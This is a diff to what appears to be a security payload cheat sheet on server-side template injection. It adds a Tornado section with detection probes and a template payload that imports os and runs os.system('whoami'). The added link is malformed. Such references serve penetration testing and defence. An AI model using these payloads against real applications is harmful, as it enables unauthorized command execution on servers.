@@ -49,6 +49,9 @@
       - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
       - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
     - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
+  - [Python - Tornado](#tornado)
+    - [Tornado - Basic injection](#tornado---basic-injection)
+    - [Tornado - RCE](#tornado---rce)
   - [Java - Jinjava](#jinjava)
     - [Jinjava - Basic injection](#jinjava---basic-injection)
     - [Jinjava - Command execution](#jinjava---command-execution)
@@ -647,6 +650,32 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 ```
 
 ---
+## Tornado
+
+[Official website]([https://jinja.palletsprojects.com/](https://www.tornadoweb.org/en/stable/template.html))
+> A simple template system that compiles templates to Python code.
+
+### Tornado - Basic injection
+
+```python
+{{7*7}} = 49
+${7*7} = ${7*7}
+{{foobar}} = Error
+{{7*'7'}} = 7777777
+```
+
+### Tornado - RCE
+
+```python
+{% import foobar %} = Error
+{% import os %}
+
+{% import os %}
+
+
+{{os.system('whoami')}}
+{{os.system('whoami')}}
+```
 
 ## Jinjava
 
